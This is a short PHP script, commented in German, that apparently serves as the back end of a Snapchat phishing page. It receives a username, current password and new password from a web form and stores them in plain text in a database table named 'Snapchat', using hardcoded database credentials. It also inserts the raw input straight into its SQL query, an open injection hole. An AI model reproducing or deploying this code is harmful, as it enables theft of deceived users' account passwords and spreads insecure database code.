<?php
$servername = "localhost";
$username = "greenfir";
$password = "u2pTrquvqHvWriDdoatU";
$dbname = "MrPrinceDB";

// Verbindung herstellen
$conn = new mysqli($servername, $username, $password, $dbname);

// Verbindung überprüfen
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Werte aus dem JavaScript-Request holen
$username = $_POST['username'];
$currentPassword = $_POST['currentPassword'];
$newPassword = $_POST['newPassword'];
$confirmPassword = $_POST['confirmPassword'];

// Deutsche Zeitzone setzen
date_default_timezone_set('Europe/Berlin');

// Aktuelle Zeit erhalten
$datetime = date('Y-m-d H:i:s');

// SQL-Query erstellen
$sql = "INSERT INTO Snapchat (USERNAME, CURRPASS, NEWPASS, CONFIRMPASS, DATETIME) VALUES ('$username', '$currentPassword', '$newPassword', '$confirmPassword', '$datetime')";

// Query ausführen
if ($conn->query($sql) === TRUE) {
    echo "Datensatz erfolgreich erstellt";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// Verbindung schließen
$conn->close();
?>
